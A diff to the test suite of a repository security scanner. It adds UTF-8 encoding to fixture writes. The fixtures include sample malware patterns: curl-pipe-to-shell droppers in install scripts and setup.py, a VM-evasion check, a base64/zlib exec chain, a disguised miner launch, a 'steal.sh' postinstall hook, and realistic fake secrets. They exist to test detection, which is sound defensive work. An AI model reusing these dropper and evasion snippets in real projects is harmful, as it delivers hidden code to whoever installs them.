@@ -2633,7 +2633,8 @@ class TestAnotherAnalysersRuleCorpusIsNotAFinding:
         package = tmp_path / "pkg"
         package.mkdir()
         (package / "package.json").write_text(
-            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node i.js"}}'
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node i.js"}}',
+            encoding="utf-8",
         )
         (package / "i.js").write_bytes(
             b"// ruleid: credential-exfiltration\n"
@@ -2729,7 +2730,8 @@ class TestTheMetadataEndpointIsNotTheNetwork:
         hook = tmp_path / "pkg"
         hook.mkdir()
         (hook / "package.json").write_text(
-            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "sh steal.sh"}}'
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "sh steal.sh"}}',
+            encoding="utf-8",
         )
         (hook / "steal.sh").write_bytes(
             Support.assemble(
@@ -3517,7 +3519,9 @@ class TestTheSecondPassOverTheCorpus:
         """Every Yarn Berry lockfile contains an entry for its own root, with no
         checksum because there is nothing to fetch. 24 of Jest's 26 blocking findings
         were that one entry, and 616 findings across 202 of 1,427 repositories."""
-        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
+        (tmp_path / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0"}', encoding="utf-8"
+        )
         (tmp_path / "yarn.lock").write_bytes(
             b"__metadata:\n  version: 10\n\n"
             b'"browser-resolve@npm:^2.0.0":\n'
@@ -3534,7 +3538,9 @@ class TestTheSecondPassOverTheCorpus:
         assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids
 
     def test_a_registry_entry_without_a_hash_still_is(self, tmp_path) -> None:
-        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
+        (tmp_path / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0"}', encoding="utf-8"
+        )
         (tmp_path / "yarn.lock").write_bytes(
             b"__metadata:\n  version: 10\n\n"
             b'"left-pad@npm:^1.3.0":\n'
@@ -3684,13 +3690,17 @@ class TestAWorkspaceMemberHasNothingToHash:
         assert unhashed == {"unhashed"}
 
     def test_end_to_end(self, tmp_path) -> None:
-        (tmp_path / "package.json").write_text('{"name": "root", "version": "1.0.0"}')
+        (tmp_path / "package.json").write_text(
+            '{"name": "root", "version": "1.0.0"}', encoding="utf-8"
+        )
         (tmp_path / "package-lock.json").write_bytes(self.LOCK)
         ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
         assert "POLICY.LOCKFILE.INTEGRITY.001" in ids, "the one real entry is still reported"
 
     def test_a_workspace_only_lockfile_is_quiet(self, tmp_path) -> None:
-        (tmp_path / "package.json").write_text('{"name": "root", "version": "1.0.0"}')
+        (tmp_path / "package.json").write_text(
+            '{"name": "root", "version": "1.0.0"}', encoding="utf-8"
+        )
         (tmp_path / "package-lock.json").write_bytes(
             b'{"name": "root", "lockfileVersion": 3, "packages": {\n'
             b'  "": {"name": "root", "version": "1.0.0"},\n'
@@ -4192,7 +4202,7 @@ class TestOneCredentialIsOneFindingAcrossFiles:
         for index in range(6):
             directory = tmp_path / f"{index:02d}-lesson" / "private-key"
             directory.mkdir(parents=True)
-            (directory / "terraform-key.pem").write_text(self.KEY)
+            (directory / "terraform-key.pem").write_text(self.KEY, encoding="utf-8")
         keys = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
         ]
@@ -4208,7 +4218,7 @@ class TestOneCredentialIsOneFindingAcrossFiles:
         for index, tail in enumerate(("MCti", "MCtj")):
             directory = tmp_path / f"{index:02d}-lesson"
             directory.mkdir()
-            (directory / "key.pem").write_text(self.KEY.replace("MCti", tail))
+            (directory / "key.pem").write_text(self.KEY.replace("MCti", tail), encoding="utf-8")
         keys = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
         ]
@@ -4217,7 +4227,7 @@ class TestOneCredentialIsOneFindingAcrossFiles:
     def test_two_matches_in_one_file_are_left_alone(self, tmp_path) -> None:
         """Collapsing within a file would throw away the line numbers, and a file with
         two copies of a key is a different question from two files with one."""
-        (tmp_path / "keys.pem").write_text(self.KEY + "\n" + self.KEY)
+        (tmp_path / "keys.pem").write_text(self.KEY + "\n" + self.KEY, encoding="utf-8")
         keys = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
         ]
@@ -4234,7 +4244,8 @@ class TestOneCredentialIsOneFindingAcrossFiles:
                 "  ingress {\n"
                 "    from_port = 22\n"
                 '    cidr_blocks = ["0.0.0.0/0"]\n'
-                "  }\n}\n"
+                "  }\n}\n",
+                encoding="utf-8",
             )
         ingress = [
             f
@@ -4321,7 +4332,9 @@ class TestADirectoryOfKeysIsACorpus:
     def write(self, directory, names) -> None:
         directory.mkdir(parents=True, exist_ok=True)
         for index, name in enumerate(names):
-            (directory / name).write_text(self.KEY.replace("MCti", f"MC{index:02d}"))
+            (directory / name).write_text(
+                self.KEY.replace("MCti", f"MC{index:02d}"), encoding="utf-8"
+            )
 
     @staticmethod
     def keys(root):
@@ -4349,7 +4362,7 @@ class TestADirectoryOfKeysIsACorpus:
         )
         deploy = tmp_path / "deploy"
         deploy.mkdir()
-        (deploy / "server.key").write_text(self.KEY.replace("MCti", "MCzz"))
+        (deploy / "server.key").write_text(self.KEY.replace("MCti", "MCzz"), encoding="utf-8")
         severities = {f.location.path: f.severity for f in self.keys(tmp_path)}
         assert severities["deploy/server.key"] >= Severity.HIGH
 
@@ -4876,7 +4889,8 @@ class TestOneDecisionAppliedSixHundredTimes:
                 "  ingress {\n"
                 "    from_port = 22\n"
                 '    cidr_blocks = ["0.0.0.0/0"]\n'
-                "  }\n}\n"
+                "  }\n}\n",
+                encoding="utf-8",
             )
         ingress = [
             f
@@ -4959,7 +4973,7 @@ class TestAValueEndingInAColonIsAFieldName:
     )
 
     def test_the_completion_table_is_not_a_credential_store(self, tmp_path) -> None:
-        (tmp_path / "editor.js").write_text(self.TABLE)
+        (tmp_path / "editor.js").write_text(self.TABLE, encoding="utf-8")
         assert not [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -4978,7 +4992,8 @@ class TestAValueEndingInAColonIsAFieldName:
             # correct behaviour and makes the fixture stop testing anything --
             # a fixture for a secret rule has to look like a secret to the rule.
             "const token = 'glpat-" + "Ax9Kd3Qm7Ry2Nv5Tb8Lz';\n"
-            "const other = 'ghp_" + "7mZq4Wc8Rn2Vt6Kd1Ly5Jb9Hs3Gx0Pf4Ua';\n"
+            "const other = 'ghp_" + "7mZq4Wc8Rn2Vt6Kd1Ly5Jb9Hs3Gx0Pf4Ua';\n",
+            encoding="utf-8",
         )
         assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
 
@@ -5001,7 +5016,8 @@ class TestFourShapesFromOneIntegrationTree:
             "    if not key_input.startswith(header):\n"
             '        key_input = f"{header}\\n{key_input}"\n'
             '    footer = "-----END PRIVATE KEY-----"\n'
-            "    return key_input + footer\n"
+            "    return key_input + footer\n",
+            encoding="utf-8",
         )
         assert not Scanner().scan(tmp_path).findings
 
@@ -5010,7 +5026,8 @@ class TestFourShapesFromOneIntegrationTree:
         the key and ignores the rest."""
         (tmp_path / "const.py").write_text(
             'DEFAULT_BASE_URL = "http://localhost:8080/v1"\n'
-            'DEFAULT_API_KEY = "sk-0000000000000000000"\n'
+            'DEFAULT_API_KEY = "sk-0000000000000000000"\n',
+            encoding="utf-8",
         )
         assert not Scanner().scan(tmp_path).findings
 
@@ -5020,7 +5037,8 @@ class TestFourShapesFromOneIntegrationTree:
         as long as one for a user who has it. The value is realistic on purpose; only the
         name says so."""
         (tmp_path / "totp.py").write_text(
-            'STORAGE_OTA_SECRET = "ota_secret"\nDUMMY_SECRET = "FPPTH34D4E3MI2HG"\n'
+            'STORAGE_OTA_SECRET = "ota_secret"\nDUMMY_SECRET = "FPPTH34D4E3MI2HG"\n',
+            encoding="utf-8",
         )
         assert not Scanner().scan(tmp_path).findings
 
@@ -5034,7 +5052,8 @@ class TestFourShapesFromOneIntegrationTree:
             '        key="mix_self_consumption_today",\n'
             '        api_key="eChargeToday1",\n'
             "    ),\n"
-            ")\n"
+            ")\n",
+            encoding="utf-8",
         )
         assert not Scanner().scan(tmp_path).findings
 
@@ -5044,7 +5063,8 @@ class TestFourShapesFromOneIntegrationTree:
         tree, assigned to a name spelled the same way as the zero-filled one."""
         (tmp_path / "api.py").write_text(
             'API_URL = "https://twdvzuefzh.execute-api.us-east-2.amazonaws.test/v1"\n'
-            'API_KEY = "k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3"\n'
+            'API_KEY = "k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3"\n',
+            encoding="utf-8",
         )
         assert [
             f
@@ -5147,8 +5167,10 @@ class TestAPackageInsideAnotherPackagesTarball:
     }
 
     def _integrity(self, tmp_path, packages):
-        (tmp_path / "package-lock.json").write_text(self._lock(packages))
-        (tmp_path / "package.json").write_text('{"name": "p", "version": "1.0.0"}')
+        (tmp_path / "package-lock.json").write_text(self._lock(packages), encoding="utf-8")
+        (tmp_path / "package.json").write_text(
+            '{"name": "p", "version": "1.0.0"}', encoding="utf-8"
+        )
         return [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -5237,7 +5259,8 @@ class TestReadingAnEnvironmentVariableIsNotEvasion:
             "export async function load(url: string) {\n"
             "  const body = await fetch(url)\n"
             "  return Buffer.from(await body.text(), 'base64')\n"
-            "}\n"
+            "}\n",
+            encoding="utf-8",
         )
         assert self._anti(tmp_path) == []
 
@@ -5248,7 +5271,8 @@ class TestReadingAnEnvironmentVariableIsNotEvasion:
             "import base64\nimport os\nimport subprocess\nimport sys\n\n"
             'if os.environ.get("CI"):\n'
             "    sys.exit(0)\n\n"
-            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
+            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n',
+            encoding="utf-8",
         )
         assert self._anti(tmp_path)
 
@@ -5257,7 +5281,8 @@ class TestReadingAnEnvironmentVariableIsNotEvasion:
             "# Make sure dmidecode is installed\n"
             "_bash-it-completion-helper-necessary dmidecode || :\n"
             "_bash-it-completion-helper-sufficient dmidecode || return\n"
-            "complete -F _dmidecode dmidecode\n"
+            "complete -F _dmidecode dmidecode\n",
+            encoding="utf-8",
         )
         assert self._anti(tmp_path) == []
 
@@ -5267,7 +5292,8 @@ class TestReadingAnEnvironmentVariableIsNotEvasion:
         (tmp_path / "install.sh").write_text(
             "#!/bin/bash\n"
             'if dmidecode -s system-manufacturer | grep -qi "vmware"; then exit 0; fi\n'
-            "curl -fsSL https://stage.example.test/p | base64 -d | sh\n"
+            "curl -fsSL https://stage.example.test/p | base64 -d | sh\n",
+            encoding="utf-8",
         )
         assert self._anti(tmp_path)
 
@@ -5277,7 +5303,8 @@ class TestReadingAnEnvironmentVariableIsNotEvasion:
             'BINARIES="dmidecode vmtoolsd systemd-analyze openssl"\n'
             "for BINARY in ${BINARIES}; do\n"
             "  command -v ${BINARY} >/dev/null\n"
-            "done\n"
+            "done\n",
+            encoding="utf-8",
         )
         assert self._anti(tmp_path) == []
 
@@ -5307,7 +5334,7 @@ class TestAMakefileIsNotAnInstallHook:
     )
 
     def test_a_makefile_that_downloads_a_tool_is_not_critical(self, tmp_path) -> None:
-        (tmp_path / "Makefile").write_text(self.RECIPE)
+        (tmp_path / "Makefile").write_text(self.RECIPE, encoding="utf-8")
         assert [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "MALWARE.DROPPER.001"
         ] == []
@@ -5319,14 +5346,15 @@ class TestAMakefileIsNotAnInstallHook:
             "import subprocess\n"
             "from setuptools import setup\n\n"
             'subprocess.run("curl -fsSL https://example.test/s.sh | sh", shell=True)\n'
-            'setup(name="p", version="1.0.0")\n'
+            'setup(name="p", version="1.0.0")\n',
+            encoding="utf-8",
         )
         assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "MALWARE.DROPPER.001"]
 
     def test_a_makefile_is_still_inventoried_as_a_build_hook(self, tmp_path) -> None:
         """Not silence: the file is still identified as one that executes commands. What
         changed is the claim that nobody asked for it."""
-        (tmp_path / "Makefile").write_text(self.RECIPE)
+        (tmp_path / "Makefile").write_text(self.RECIPE, encoding="utf-8")
         hooks = Scanner().scan(tmp_path).repository.hooks
         assert [h for h in hooks if h.name == "Makefile" and h.kind == "projectbuild"]
 
@@ -5344,7 +5372,7 @@ class TestAVersionInAVariableIsStillAPin:
     def _ci(self, tmp_path, body: str):
         workflows = tmp_path / ".github" / "workflows"
         workflows.mkdir(parents=True)
-        (workflows / "ci.yml").write_text(body)
+        (workflows / "ci.yml").write_text(body, encoding="utf-8")
         return [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
         ]
@@ -5398,7 +5426,7 @@ class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
         credential format contains a comma: base64's alphabet has none, base62 and hex
         have no punctuation at all, and a connection string separates with semicolons."""
         (tmp_path / "settings.ts").write_text(
-            "const defaultByPassRules = 'localhost,127.0.0.1,::1'\n"
+            "const defaultByPassRules = 'localhost,127.0.0.1,::1'\n", encoding="utf-8"
         )
         assert self._hits(tmp_path) == []
 
@@ -5409,7 +5437,8 @@ class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
             "module RuboCop\n"
             "  COMPLEX_STRING_BEGIN_TOKEN = :tSTRING_BEG\n"
             "  COMPLEX_STRING_END_TOKEN = :tSTRING_END\n"
-            "end\n"
+            "end\n",
+            encoding="utf-8",
         )
         assert self._hits(tmp_path) == []
 
@@ -5418,7 +5447,7 @@ class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
         already said this was the name of a field; the leading dashes were what the
         pattern could not get past."""
         (tmp_path / "transform-font.ts").write_text(
-            'const config = {\n    supportToken: "--font-heading:",\n}\n'
+            'const config = {\n    supportToken: "--font-heading:",\n}\n', encoding="utf-8"
         )
         assert self._hits(tmp_path) == []
 
@@ -5428,7 +5457,8 @@ class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
         `hoppscotch` each commit one in their telemetry module, and a finding about it
         has nothing to rotate and nothing to remove."""
         (tmp_path / "telemetry.py").write_text(
-            "POSTHOG_PROJECT_API_KEY = 'phc_Bd6Xr2Nk9Tq4Wz7Mv1Ly5Hc8Jp3Fs0Ge6Au2Rn4Vi7X'\n"
+            "POSTHOG_PROJECT_API_KEY = 'phc_Bd6Xr2Nk9Tq4Wz7Mv1Ly5Hc8Jp3Fs0Ge6Au2Rn4Vi7X'\n",
+            encoding="utf-8",
         )
         assert self._hits(tmp_path) == []
 
@@ -5450,7 +5480,8 @@ class TestFourMoreWaysToWriteSomethingThatIsNotACredential:
             # Split, for the reason given in `test_the_sequence_has_to_be_the_value`.
             # `phx_` is the one PostHog prefix that is genuinely secret, so it is the
             # one every scanner matches -- including the one guarding this repository.
-            "POSTHOG_PERSONAL_API_KEY = 'phx_" + "Nv7Kq2Wd9Rt4Zx1Vb6Mc3Jf8Hs5Lp0Gy2Ae7Un4Ri9Tb'\n"
+            "POSTHOG_PERSONAL_API_KEY = 'phx_" + "Nv7Kq2Wd9Rt4Zx1Vb6Mc3Jf8Hs5Lp0Gy2Ae7Un4Ri9Tb'\n",
+            encoding="utf-8",
         )
         assert self._hits(tmp_path)
 
@@ -5461,7 +5492,7 @@ class TestThreeWaysToTypeAValueYouDidNotHave:
         The identifier branch allowed two leading underscores and a marker uses as many
         as it takes to be unmistakable."""
         (tmp_path / "v8_suppressions.py").write_text(
-            "SMOKE_TEST_END_TOKEN = '___foozzie___smoke_test_end___'\n"
+            "SMOKE_TEST_END_TOKEN = '___foozzie___smoke_test_end___'\n", encoding="utf-8"
         )
         assert not [
             f
@@ -5475,7 +5506,8 @@ class TestThreeWaysToTypeAValueYouDidNotHave:
         with the separators left out, which is how it gets typed."""
         (tmp_path / "seed.ts").write_text(
             "export const admin = {\n  email: 'a@example.test',\n"
-            "  password: 'thisIsAPassword123',\n}\n"
+            "  password: 'thisIsAPassword123',\n}\n",
+            encoding="utf-8",
         )
         assert not [
             f
@@ -5486,7 +5518,9 @@ class TestThreeWaysToTypeAValueYouDidNotHave:
     def test_a_run_of_digits(self, tmp_path) -> None:
         """Fastlane documents `sonar_token: "123456abcdef"`. Six consecutive digits
         inside real base64 key material is about one chance in a billion."""
-        (tmp_path / "sonar.rb").write_text('  options = {\n    sonar_token: "123456abcdef",\n  }\n')
+        (tmp_path / "sonar.rb").write_text(
+            '  options = {\n    sonar_token: "123456abcdef",\n  }\n', encoding="utf-8"
+        )
         assert not [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -5536,7 +5570,7 @@ class TestAPayoutAddressIsNotAMiner:
         return [f for f in Scanner().scan(path).findings if "CRYPTOMINER" in f.rule_id]
 
     def test_a_donation_address_is_not_mining(self, tmp_path) -> None:
-        (tmp_path / "DonateSettings.xaml").write_text(self.DONATION)
+        (tmp_path / "DonateSettings.xaml").write_text(self.DONATION, encoding="utf-8")
         assert self._mining(tmp_path) == []
 
     def test_a_pool_protocol_still_is(self, tmp_path) -> None:
@@ -5545,7 +5579,8 @@ class TestAPayoutAddressIsNotAMiner:
         (tmp_path / "miner.py").write_text(
             'POOL = "stratum+tcp://pool.minexmr.invalid:4444"\n'
             'WALLET = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
-            'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
+            'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n',
+            encoding="utf-8",
         )
         assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]
 
@@ -5555,7 +5590,8 @@ class TestAPayoutAddressIsNotAMiner:
         (tmp_path / "setup.py").write_text(
             "from setuptools import setup\n\n"
             'print("Support us: bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq")\n'
-            'setup(name="p", version="1.0.0")\n'
+            'setup(name="p", version="1.0.0")\n',
+            encoding="utf-8",
         )
         assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH] == []
 
@@ -5566,7 +5602,8 @@ class TestAPayoutAddressIsNotAMiner:
             'PAYOUT = "4A123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnop'
             'qrstuvwxyz123456789ABCDEFGHJKLMNPQRSTUVWXYZab"\n'
             'subprocess.Popen(["/tmp/.cache/kworker", "-u", PAYOUT])\n'
-            'setup(name="p", version="1.0.0")\n'
+            'setup(name="p", version="1.0.0")\n',
+            encoding="utf-8",
         )
         assert [f for f in self._mining(tmp_path) if f.severity >= Severity.HIGH]
 
@@ -5594,14 +5631,15 @@ class TestAKeyTheVendorGeneratedForYouToShip:
                     "project_info": {"project_id": "demo-app"},
                     "client": [{"api_key": [{"current_key": self.KEY}]}],
                 }
-            )
+            ),
+            encoding="utf-8",
         )
         assert not [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
 
     def test_the_same_key_anywhere_else_is(self, tmp_path) -> None:
         """The control, and why the exemption is scoped to those filenames: a Google
         Cloud key with billing attached is written exactly the same way."""
-        (tmp_path / "config.py").write_text(f'GOOGLE_MAPS_KEY = "{self.KEY}"\n')
+        (tmp_path / "config.py").write_text(f'GOOGLE_MAPS_KEY = "{self.KEY}"\n', encoding="utf-8")
         assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
 
 
@@ -5624,7 +5662,7 @@ class TestThreeKeysThatAnnounceThemselves:
     def test_a_directory_whose_name_ends_in_test(self, tmp_path) -> None:
         tree = tmp_path / "caddytest"
         tree.mkdir()
-        (tree / "caddy.localhost.key").write_text(self.BODY)
+        (tree / "caddy.localhost.key").write_text(self.BODY, encoding="utf-8")
         hits = self._keys(tmp_path)
         assert hits, "still reported"
         assert all(f.severity <= Severity.MEDIUM for f in hits)
@@ -5632,8 +5670,10 @@ class TestThreeKeysThatAnnounceThemselves:
     def test_a_filename_that_says_it_is_not_real(self, tmp_path) -> None:
         # Different bodies, or the two files collapse into one finding by file hash and
         # the test would pass on half of what it means to assert.
-        (tmp_path / "ecs_fake_private").write_text(self.BODY)
-        (tmp_path / "example.key.pem").write_text(self.BODY.replace("zR4W", "p4Lm"))
+        (tmp_path / "ecs_fake_private").write_text(self.BODY, encoding="utf-8")
+        (tmp_path / "example.key.pem").write_text(
+            self.BODY.replace("zR4W", "p4Lm"), encoding="utf-8"
+        )
         hits = self._keys(tmp_path)
         assert len(hits) == 2
         assert all(f.severity <= Severity.MEDIUM for f in hits)
@@ -5642,7 +5682,7 @@ class TestThreeKeysThatAnnounceThemselves:
         """The control."""
         deploy = tmp_path / "deploy"
         deploy.mkdir()
-        (deploy / "id_rsa").write_text(self.BODY)
+        (deploy / "id_rsa").write_text(self.BODY, encoding="utf-8")
         assert [f for f in self._keys(tmp_path) if f.severity >= Severity.HIGH]
 
     def test_the_vagrant_insecure_key_is_published_on_purpose(self, tmp_path) -> None:
@@ -5655,7 +5695,8 @@ class TestThreeKeysThatAnnounceThemselves:
             "-----BEGIN RSA PRIVATE KEY-----\n"
             "MIIEogIBAAKCAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzI\n"
             + "\n".join(["w+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoP"] * 15)
-            + "\n-----END RSA PRIVATE KEY-----\n"
+            + "\n-----END RSA PRIVATE KEY-----\n",
+            encoding="utf-8",
         )
         assert self._keys(tmp_path) == []
 
@@ -5672,13 +5713,15 @@ class TestBeingAVpnIsNotAnEscape:
     COMPOSE = "services:\n  openvpn:\n    image: openvpn:latest\n    cap_add:\n      - NET_ADMIN\n"
 
     def test_net_admin_does_not_block(self, tmp_path) -> None:
-        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE)
+        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE, encoding="utf-8")
         hits = [f for f in Scanner().scan(tmp_path).findings if "K8S" in f.rule_id]
         assert hits, "still reported"
         assert all(f.severity <= Severity.MEDIUM for f in hits)
 
     def test_sys_admin_still_does(self, tmp_path) -> None:
-        (tmp_path / "docker-compose.yml").write_text(self.COMPOSE.replace("NET_ADMIN", "SYS_ADMIN"))
+        (tmp_path / "docker-compose.yml").write_text(
+            self.COMPOSE.replace("NET_ADMIN", "SYS_ADMIN"), encoding="utf-8"
+        )
         assert [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -5707,7 +5750,8 @@ class TestAHostWithNoDotInIt:
         (tmp_path / "setup.cfg").write_text(
             "[db]\n"
             "mssql = mssql+pyodbc://scott:tiger^5HHH@mssql2022:1433/test?driver=ODBC\n"
-            "pymssql = mssql+pymssql://scott:tiger^5HHH@mssql2022:1433/test\n"
+            "pymssql = mssql+pymssql://scott:tiger^5HHH@mssql2022:1433/test\n",
+            encoding="utf-8",
         )
         assert self._urls(tmp_path) == []
 
@@ -5715,7 +5759,8 @@ class TestAHostWithNoDotInIt:
         """The control, and the reason private ranges were never added to this list: a
         credential for something that resolves is a credential for something real."""
         (tmp_path / "config.py").write_text(
-            'DSN = "postgres://admin:Xk9mQ2vB7wRtY4uZ@db.prod.internal-corp.net:5432/app"\n'
+            'DSN = "postgres://admin:Xk9mQ2vB7wRtY4uZ@db.prod.internal-corp.net:5432/app"\n',
+            encoding="utf-8",
         )
         assert [f for f in self._urls(tmp_path) if f.severity >= Severity.HIGH]
 
@@ -5723,7 +5768,8 @@ class TestAHostWithNoDotInIt:
         """Postgres documents the syntax its own parser accepts, in a comment, in
         brackets. A bracket is not in base64's alphabet any more than a parenthesis is."""
         (tmp_path / "fe-connect.c").write_text(
-            "/*\n * postgresql://[user[:password]@][netloc][:port][/dbname][?param1=value1]\n */\n"
+            "/*\n * postgresql://[user[:password]@][netloc][:port][/dbname][?param1=value1]\n */\n",
+            encoding="utf-8",
         )
         assert self._urls(tmp_path) == []
 
@@ -5734,7 +5780,8 @@ class TestAHostWithNoDotInIt:
         tree.mkdir(parents=True)
         (tree / "test.lua").write_text(
             "assert_url(vlc.strings.url_parse('sftp://userbla:Passw0rd@server.org/x'),\n"
-            "           'sftp', 'userbla', 'Passw0rd', 'server.org', 0, '/x')\n"
+            "           'sftp', 'userbla', 'Passw0rd', 'server.org', 0, '/x')\n",
+            encoding="utf-8",
         )
         hits = self._urls(tmp_path)
         assert hits, "still reported"
@@ -5828,7 +5875,8 @@ class TestAnUninstallerIsTheOppositeOfPersistence:
             "if [[ -d '/etc/systemd/system/pihole-FTL.service.d' ]]; then\n"
             "  rm -rf /etc/systemd/system/pihole-FTL.service.d\n"
             "fi\n"
-            "curl -sSL https://install.example.test/uninstall > /dev/null\n"
+            "curl -sSL https://install.example.test/uninstall > /dev/null\n",
+            encoding="utf-8",
         )
         assert self._persist(tmp_path) == []
 
@@ -5841,7 +5889,8 @@ class TestAnUninstallerIsTheOppositeOfPersistence:
             "#!/bin/bash\n"
             "curl -sSL https://install.example.test/agent -o /usr/local/bin/agent\n"
             "cp agent.service /etc/systemd/system/agent.service\n"
-            "systemctl enable agent.service\n"
+            "systemctl enable agent.service\n",
+            encoding="utf-8",
         )
         assert self._persist(tmp_path)
 
@@ -5872,7 +5921,8 @@ class TestTwoSpellingsOfOneDecodeAreNotAStack:
             '            log_error "Failed to decode file list" >&2\n'
             "        fi\n"
             "    fi\n"
-            "}\n"
+            "}\n",
+            encoding="utf-8",
         )
         assert not [f for f in Scanner().scan(tmp_path).findings if "DECODE_CHAIN" in f.rule_id]
 
@@ -5883,7 +5933,8 @@ class TestTwoSpellingsOfOneDecodeAreNotAStack:
             'BLOB = "eNorTi0sTS1SSM7PLShKLS5OTVFIzs8tKEotLk5NUQAAoTMK1g=="\n\n'
             "stage_one = base64.b64decode(BLOB)\n"
             "stage_two = zlib.decompress(stage_one)\n"
-            "exec(stage_two.decode())\n"
+            "exec(stage_two.decode())\n",
+            encoding="utf-8",
         )
         assert [
             f
@@ -5923,7 +5974,8 @@ class TestAFileOfKeysIsATable:
             "".join(
                 f'pub const KEY_{size}: &str = "{self._key(seed)}";\n'
                 for size, seed in ((2048, "a"), (3072, "b"), (4096, "c"), (8192, "d"))
-            )
+            ),
+            encoding="utf-8",
         )
         keys = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
@@ -5935,7 +5987,7 @@ class TestAFileOfKeysIsATable:
 
     def test_one_key_in_a_file_is_what_a_leak_looks_like(self, tmp_path) -> None:
         """The control, and the whole reason the threshold exists."""
-        (tmp_path / "deploy_key").write_text(self._key("e"))
+        (tmp_path / "deploy_key").write_text(self._key("e"), encoding="utf-8")
         assert [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -5946,7 +5998,7 @@ class TestAFileOfKeysIsATable:
         """The threshold asserted from below. A keypair committed together is two places
         somebody has to look."""
         (tmp_path / "keys.go").write_text(
-            f"const a = `{self._key('f')}`\nconst b = `{self._key('g')}`\n"
+            f"const a = `{self._key('f')}`\nconst b = `{self._key('g')}`\n", encoding="utf-8"
         )
         keys = [
             f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
@@ -6002,7 +6054,9 @@ class TestTheAlphabetAndTheDigitsAreTwoRuns:
 
         assert SecretNames.names_placeholder("DEMO_PASSWORD")
         assert not SecretNames.names_placeholder("TEST_API_KEY")
-        (tmp_path / "_demo_workspace.py").write_text('DEMO_PASSWORD = "Praxis@2026!"\n')
+        (tmp_path / "_demo_workspace.py").write_text(
+            'DEMO_PASSWORD = "Praxis@2026!"\n', encoding="utf-8"
+        )
         assert not [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -6015,7 +6069,9 @@ class TestTheAlphabetAndTheDigitsAreTwoRuns:
         that repository rather than in this rule."""
         scripts = tmp_path / "scripts"
         scripts.mkdir()
-        (scripts / "isolation_matrix.py").write_text('PASSWORD = "Praxis@2026!"\n')
+        (scripts / "isolation_matrix.py").write_text(
+            'PASSWORD = "Praxis@2026!"\n', encoding="utf-8"
+        )
         assert [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -6057,7 +6113,7 @@ class TestProseInsideABlockComment:
     )
 
     def test_a_credential_quoted_in_prose_is_not_a_credential(self, tmp_path) -> None:
-        (tmp_path / "AuthForm.tsx").write_text(self.COMMENT)
+        (tmp_path / "AuthForm.tsx").write_text(self.COMMENT, encoding="utf-8")
         assert not [
             f
             for f in Scanner().scan(tmp_path).findings
@@ -6077,7 +6133,8 @@ class TestProseInsideABlockComment:
             "       which meant the image held whatever that host served that minute.\n"
             "   */\n"
             "  return runPinned();\n"
-            "}\n"
+            "}\n",
+            encoding="utf-8",
         )
         assert Scanner().scan(tmp_path).findings == ()
 
@@ -6087,7 +6144,8 @@ class TestProseInsideABlockComment:
             self.COMMENT.replace(
                 "      /* Defence for the one case React cannot handle: a handler that never\n",
                 "      /* Defence. */\n",
-            )
+            ),
+            encoding="utf-8",
         )
         assert [
             f
@@ -6098,7 +6156,8 @@ class TestProseInsideABlockComment:
     def test_a_block_opener_inside_a_string_opens_nothing(self, tmp_path) -> None:
         """What keeps the span pass honest: `"/*"` is two characters of data."""
         (tmp_path / "lexer.ts").write_text(
-            'const BLOCK_OPEN = "/*";\nexport const token = "Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5";\n'
+            'const BLOCK_OPEN = "/*";\nexport const token = "Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5";\n',
+            encoding="utf-8",
         )
         assert [
             f
